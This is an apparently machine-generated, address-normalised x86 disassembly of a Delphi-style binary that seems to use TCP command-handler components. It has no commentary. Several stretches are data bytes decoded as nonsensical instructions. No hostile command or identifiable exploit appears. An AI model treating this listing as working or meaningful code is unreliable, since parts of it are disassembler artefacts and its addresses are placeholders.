push sub_474b9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_474b7f
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_474dbc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_474dbc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474b86
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_420e74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_474bdc
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
jo r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
add al ch
dec ebx
inc edi
add [ ecx - 0x173c743d ] cl
stosd [ edi ]
in al 0xf8
dec [ ebx + 0x4289fc55 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
mov edx [ ebx + 0x4 ]
call sub_403fa4
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42be8c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push j_sub_40361c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_474c24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42be8c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push j_sub_40361c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_474cbc
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420bb0
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_474cf4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bf14
xor eax eax
push ebp
push sub_474d4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_474dbc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474d51
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bf1c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420e74
sub_474d54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bf14
xor eax eax
push ebp
push sub_474db2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_474dbc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474db9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bf1c
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_474dbc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_42bf14
xor eax eax
push ebp
push sub_474e1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42bf1c
retn
sub_474e78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474e9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ea4
retn
sub_474eb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
dec edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] bh
inc edi
add [ eax + eax ] bh
add [ eax ] al
hlt
sub_474fa4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_46ecec
test al al
jne r-xdata
mov [ ebx + 0xf ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
jne r-xdata
mov eax ebx
call sub_403154
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx ebx
mov eax [ esi + 0x30 ]
call sub_418988
pop esi
pop ebx
retn
sub_474fe4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_475009
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475010
retn
sub_4752d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4752f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4752fc
retn
sub_475308
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4753dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0xc ]
call sub_404210
mov [ ebp - 0x10 ] eax
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_404554
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404470
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4753e3
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f74
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46edb4
mov esi eax
test esi esi
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_4753ec
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47551d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_404210
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea edx [ ebp - 0xc ]
mov eax esi
call sub_407f4c
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
call sub_404210
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475524
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x14 ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_403f50
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ esi + eax ] 0x20
jbe r-xdata
inc [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_404554
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404210
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404470
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_404470
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_407f4c
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_46edb4
mov esi eax
test esi esi
jg r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_407f4c
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
add ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_47552c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_475551
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475558
retn
sub_475564
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4755a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418974
cmp ebx [ eax + 0x8 ]
seta [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4189d8
retn
sub_4755bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4755e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4755e8
retn
sub_475759
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
push esp
push 0x64616572
inc ebx
insb
popad
jae r-xdata
push ebp
cld
dec esi
outsd
je r-xdata
in al dx
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47583b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
jo r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_46ed18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475842
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
and [ ebx + 0x7500347b ] al
and [ ebp + 0x50a1fc55 ] ecx
or [ eax ] 0xf9048ae8
dec [ ebx + 0x1b2fc4d ]
arpl [ ecx + 0x66 ] bp
imul esp [ ebp + 0x64 ] 0x84565390
shl [ eax + ecx - 0x7d ] cl
sub_475784
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420fcc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ esi + 0x30 ] eax
mov [ esi + 0x38 ] 0x3
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4757cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47583b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ ebx + 0x34 ]
call [ eax + 0x28 ]
mov esi eax
mov ecx 0x80000001
mov dl [ ebx + 0x38 ]
mov eax esi
call sub_46ed18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475842
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_47584c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x30 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_475880
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4758a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4758ac
retn
sub_475a1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x47 ] bl
add al al
pop edx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x55ffb8a6 ] ah
pop edx
inc edi
add [ eax + eax ] bh
add [ eax ] al
cmp al 0x5f
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xchg esp eax
jpe r-xdata
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
lodsb [ esi ]
mov eax [ ecx ]
int3
jpo r-xdata
pop edx
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebx
outsd
insd
insd
popad
outsb
dec eax
popad
outsb
insb
jb r-xdata
add [ ecx + edi * 2 + 0x76780047 ] dh
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb al 0x0
add [ eax ] al
add [ eax ] eax
sbb [ eax ] al
add bh bh
sbb [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or al [ ecx + ebp * 2 + 0x73 ]
arpl [ edi + 0x6e ] bp
outsb
arpl [ gs : eax + eax + 0x10 ] si
pop edx
inc edi
add al cl
pop edi
inc ecx
add [ eax + eax ] cl
or ecx [ ecx + 0x64 ]
push esp
inc ebx
push eax
push ebx
jb r-xdata
add eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4e
popad
insd
sbb [ gs : ecx + 0x47 ] 0x0
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
inc ebx
outsd
insd
insd
popad
outsb
sub [ fs : eax ] dl
inc eax
add [ eax ] ch
add [ eax ] al
[ eax ]
sbb [ eax ] eax
add bh bh
sbb [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
inc eax
add [ ecx ] bl
add [ eax ] al
[ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0000 ] al
insd
inc esp
insb
imul ebp [ ebp + 0x69 ] 0x94726574
adc [ eax ] al
adc [ eax ] al
add bh bh
adc [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
pop es
inc ebx
outsd
insd
insd
popad
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440a0002 ] al
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax + eax + 0x10 ] si
add [ eax ] ch
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x43
sub_4767cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4704e8
mov [ esi + 0x70 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_471138
mov [ esi + 0x9c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_477614
mov [ esi + 0x74 ] eax
mov [ esi + 0x78 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x7c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0x94 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ esi + 0xac ] eax
mov eax [ r-xdata ]
mov [ esi + 0xa8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470d70
mov [ esi + 0xf4 ] eax
mov [ esi + 0xa4 ] 0x1388
mov [ esi + 0x90 ] 0xf
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4768a8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
cmp [ esi + 0x88 ] 0x0
je r-xdata
lea eax [ esi + 0x70 ]
call sub_40d130
lea eax [ esi + 0xf4 ]
call sub_40d130
lea eax [ esi + 0x9c ]
call sub_40d130
lea eax [ esi + 0xac ]
call sub_40d130
lea eax [ esi + 0x94 ]
call sub_40d130
lea eax [ esi + 0x7c ]
call sub_40d130
lea eax [ esi + 0x74 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f7b0
test bl bl
jle r-xdata
cmp [ esi + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
lea eax [ esi + 0x88 ]
call sub_40d130
sub_476978
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x7c ]
mov eax [ ebx + 0x9c ]
call sub_4711d0
mov edx [ ebx + 0x7c ]
mov eax [ esi + 0x68 ]
call sub_47446c
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4769ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476b46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4192f0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476b4d
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
mov eax [ ebp - 0x10 ]
call sub_404210
test eax eax
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_476958
xor eax eax
push ebp
push sub_476b02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4192f0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_476938
retn
inc eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4192f0
dec eax
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x20 ]
test al al
jne r-xdata
inc ebx
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_476b80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_477658
mov esi eax
cmp [ esi + 0x19 ] 0x0
je r-xdata
sub_476b80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_476c0c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xea ] 0x0
je r-xdata
mov eax [ ebx + 0xf4 ]
call sub_471070
test al al
je r-xdata
push esi
mov ecx edx
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov edx [ ebx + 0xf4 ]
mov eax [ esi + 0x68 ]
call sub_47446c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476c13
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_476c20
push ebx
mov ebx eax
mov eax ebx
call sub_42141c
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x68 ] 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_476c40
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x6c ]
jne r-xdata
cmp edi [ esi + 0x84 ]
jne r-xdata
mov eax esi
call sub_476ff8
xor eax eax
mov [ esi + 0x6c ] eax
jmp r-xdata
cmp edi [ esi + 0x88 ]
jne r-xdata
xor eax eax
mov [ esi + 0x84 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x88 ] eax
sub_476c94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x68 ] dl
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x68 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476f50
xor eax eax
push ebp
push sub_476e92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_476ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x79 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_475564
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4192f0
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x79 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_40d130
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_477118
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4704c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4192f0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f718
mov edx eax
mov eax [ ebp - 0x4 ]
